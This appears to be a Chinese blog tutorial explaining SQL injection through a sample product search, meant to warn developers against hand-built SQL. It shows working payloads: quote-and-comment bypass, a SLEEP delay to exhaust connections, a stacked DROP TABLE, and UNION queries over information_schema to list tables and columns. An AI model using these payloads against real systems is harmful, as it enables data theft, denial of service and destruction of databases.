---
title: SQL注入基本原理
subtitle: 知已知彼，百战不殆。
description: sql,sql injection,sql注入
date: 2019-11-24
layout: default
bg_url: "assets/images/code.jpg"
category: 技术
---

## SQL注入基本原理

WEB技术发展日新月异，但是徒手拼SQL的传统手艺还是受相当多的开发者亲睐。毕竟相比于再去学习一套复杂的[ORM](https://en.wikipedia.org/wiki/Object-relational_mapping)规则，手拼更说方便，直观。通常自己拼SQL的人，应该是有听说过**SQL注入**很危险，但是总是心想：我的SQL语句这么简单，不可能被注入的。

花3分钟看懂这个完整的例子，从今往后应该再也不会手拼SQL啦。

### 简单场景

有一个WEB界面提供输入商品名称，展示对应价格，生产日期及生产地信息。例如输入Hammer展示：

| 产品        | 价格  | 生产地   | 生产日期   |
| ----------- | ----- | -------- | ---------- |
| Claw Hammer | 12.98 | American | 2019.11.07 |
| Club Hammer | 29.98 | Canada   | 2019.11.11 |

我们跳过了搭建Web搜索界面的过程，直接关注重点部分: **SQL注入**。

如果要实现以上功能，那么我们大致可以猜到服务器使用的SQL语句如下：

```sql
SELECT ? FROM ? WHERE ? LIKE '%Hammer%';
```

其中`?`表示目前我们并不知道具体的表名和字段名，此SQL唯一可以被操纵的就是单引号里面的输入内容`'%Hammer%`。假如我们直接在查找框里输入一个单引号。即变成

```sql
select ? from ? where ? Like '%'%';    
```

这样拼接后造成SQL语法错误，得不到任何结果，我们需要使用`--`来把最后一个单引号注释掉。

```sql
select ? from ? where ? Like '%'; -- %';    
```

`--`后的是注释内容(你也可以用`#`），这样你可以得到所有的产品信息，目前为止，还是没有嗅到危险的信号。

| 产品         | 价格  | 生产地   | 生产日期   |
| :----------- | ----- | -------- | ---------- |
| Claw Hammer  | 12.98 | American | 2019.11.07 |
| Club Hammer  | 29.98 | Canada   | 2019.11.11 |
| Paring Knife | 10.98 | China    | 2019.11.11 |
| Boning Knife | 19.98 | China    | 2019.01.01 |

### 小试牛刀and

紧紧抓住上一步中可以扩展的单引号部分。来一个简单的延时语句试一试:

```sql
select ? from ? where ? Like '%Hammer%' and 1 = SLEEP(2); -- %';  
```

这时查询会2秒后才返回结果，如果把时间延长，用脚本多点几次查询，一下就能把数据库的连接池用完。

当然，还有破坏力更强的！

```sql
select ? from ? where ? Like '%Hammer%'; drop table xxxx; -- %'; 
```

可以直接把表/数据库直接删除掉，至于如何知道引数据库中有哪一些表(即如何确定上句SQL中的`xxxx`)呢？

### 为所欲为union

 我们需要知道此数据库有哪一些表！这样才能能拿到有用的信息。

使用`union`可以把不同表的内容拼在一起，小试一下：

```sql
select ?,?,?,? from ? where ? Like '%Hammer%' UNION (select 1,2,3,4 from dual); -- %';  
```

| 产品        | 价格  | 生产地   | 生产日期   |
| :---------- | ----- | -------- | ---------- |
| Claw Hammer | 12.98 | American | 2019.11.07 |
| Club Hammer | 29.98 | Canada   | 2019.11.11 |
| 1           | 2     | 3        | 4          |

可以看到我们把假数据`1，2，3，4`成功地拼接到搜索结果中。

Mysql系统自带的信息都存在`information_schema`数据库中。我们试着在里面找找有用的信息。

```sql
select ? from ? where ? Like '%Hammer%' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4 from information_schema.tables); --%';  
```

| 产品        | 价格    | 生产地   | 生产日期   |
| :---------- | ------- | -------- | ---------- |
| Claw Hammer | 12.98   | American | 2019.11.07 |
| Club Hammer | 29.98   | Canada   | 2019.11.11 |
| authors     | hawkeye | 3        | 4          |
| products    | hawkeye | 3        | 4          |
| user        | hawkeye | 3        | 4          |
| ....        | ....    | 3        | 4          |

现在知道了这些数据库名和表名，所有人都对它为所欲为了！(**包括上面执行的DROP**)。

看着列表一猜就能知道我们目前查的是products表，接下来我们再把products具体的字段也挖出来。

```sql
select ? from ? where ? Like '%Hammer%' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); -- %';  
```

| 产品        | 价格    | 生产地   | 生产日期   |
| :---------- | ------- | -------- | ---------- |
| Claw Hammer | 12.98   | American | 2019.11.07 |
| Club Hammer | 29.98   | Canada   | 2019.11.11 |
| id          | hawkeye | 3        | 4          |
| name        | hawkeye | 3        | 4          |
| price       | hawkeye | 3        | 4          |
| address     | hawkeye | 3        | 4          |
| updated_at  | hawkeye | 3        | 4          |

所以，通过上面2步，我们知道了表名和字段名，那么查询API的完整SQL应该是(把上面的`?`都补全啦)：

```sql
select name,price,address,updated_at from products where name like '%Hammer%';
```

通过不断重复以上几个步骤，你就可以通过这一个小小的入口把数据库的所有信息(比如上面发现的`user`表🤤)都翻个遍。

注意：以上都是在自己的机器上尝试的，千万不要越界去hack别人家的服务器！

如果你SQL注入想要更深入/系统的学习，可以使用当然你可以自己本地搭建[DVWA](https://github.com/ethicalhack3r/DVWA)，或挑战[HackMe-SQL-Injection-Challenges](https://github.com/breakthenet/HackMe-SQL-Injection-Challenges)。

